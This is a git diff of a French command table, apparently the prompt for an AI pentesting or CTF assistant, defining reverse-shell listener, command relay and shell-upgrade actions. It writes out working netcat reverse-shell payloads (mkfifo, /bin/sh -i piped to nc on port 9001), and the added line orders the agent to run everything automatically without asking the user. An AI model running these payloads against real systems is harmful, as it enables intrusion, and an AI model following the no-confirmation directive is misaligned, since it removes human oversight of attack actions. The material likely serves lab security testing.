@@ -141,7 +141,7 @@ Pour les ports non-standard (8080, 3000, etc.), ajoute le port : \`http://${doma
 | **shell ssh <user>** | Connexion SSH | ssh <user>@${ip} (avec password ou clé) |
 | **shell reverse <port>** | Écouter un reverse shell via FIFO | rm -f /tmp/shell_in /tmp/shell_out; mkfifo /tmp/shell_in; tail -f /tmp/shell_in | ncat -lvnp <port> -k > /tmp/shell_out 2>&1 & echo "Listener started on port <port> (PID: $!)" |
 | **shell cmd <commande>** | Envoyer une commande au reverse shell | echo "<commande>" > /tmp/shell_in; sleep 1; cat /tmp/shell_out |
-| **shell upgrade** | Ouvrir un shell interactif dans un nouveau terminal | 1) Ouvre un nouveau terminal avec le listener : \`${openTerminal}\` 2) Trigger un nouveau reverse shell vers ce port via le FIFO : \`echo "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc <VPN_IP> 9001 >/tmp/g" > /tmp/shell_in\` 3) Affiche les instructions TTY upgrade à l'utilisateur : \`python3 -c "import pty;pty.spawn('/bin/bash')"\` puis Ctrl+Z, \`stty raw -echo; fg\`, \`export TERM=xterm\` |
+| **shell upgrade** | Ouvrir un shell interactif dans un nouveau terminal — EXÉCUTE TOUT AUTOMATIQUEMENT, NE DEMANDE RIEN À L'UTILISATEUR | Enchaîne ces 3 Bash dans l'ordre : 1) \`${openTerminal}\` 2) \`sleep 2; echo "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc $(ip -4 addr show tun0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1 || ifconfig utun4 2>/dev/null | grep 'inet ' | awk '{print $2}') 9001 >/tmp/g" > /tmp/shell_in\` 3) Affiche à l'utilisateur : "Terminal ouvert ! Dans le nouveau terminal, tape : python3 -c \\"import pty;pty.spawn('/bin/bash')\\" puis Ctrl+Z, stty raw -echo; fg, export TERM=xterm" |
 
 ### crack — Cracking
 | Commande | Actions | Outils |
